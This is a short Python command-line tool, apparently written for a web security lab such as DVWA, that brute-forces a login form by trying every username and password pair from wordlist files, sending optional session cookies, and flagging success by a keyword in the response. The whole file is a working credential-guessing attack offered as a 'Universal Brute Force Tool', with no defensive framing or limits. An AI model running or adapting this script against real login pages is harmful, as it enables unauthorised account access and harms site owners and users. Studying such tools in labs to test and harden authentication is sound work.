import requests
import argparse
import sys

def run_brute_force(url, user_file, pass_file, cookie_str, success_msg):
    # 쿠키 파싱 (문자열 형태 "key1=val1; key2=val2"를 딕셔너리로 변환)
    cookies = {}
    if cookie_str:
        for item in cookie_str.split(";"):
            key, val = item.strip().split("=")
            cookies[key] = val

    print(f"[*] Target: {url}")
    print("[*] Brute Force Start...\n")

    try:
        with open(user_file, "r") as f: usernames = [line.strip() for line in f]
        with open(pass_file, "r") as f: passwords = [line.strip() for line in f]
    except FileNotFoundError as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

    for username in usernames:
        for password in passwords:
            print(f"[TRY] USER: {username:10} | PASS: {password:10}", end=" | ", flush=True)
            
            params = {"username": username, "password": password, "Login": "Login"}
            response = requests.get(url, params=params, cookies=cookies)
            
            length = len(response.text)
            print(f"LEN: {length}")

            if success_msg.lower() in response.text.lower():
                print(f"\n[SUCCESS] FOUND: {username}:{password}")
                return

    print("\n[FAILED] No valid credentials found.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal Brute Force Tool")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--users", default="users.txt", help="Username file")
    parser.add_argument("--passwords", default="clean.txt", help="Password file")
    parser.add_argument("--cookie", nargs='?', default="", help="Cookies (optional)")
    parser.add_argument("--msg", default="welcome", help="Success keyword")

    args = parser.parse_args()
    run_brute_force(args.url, args.users, args.passwords, args.cookie, args.msg)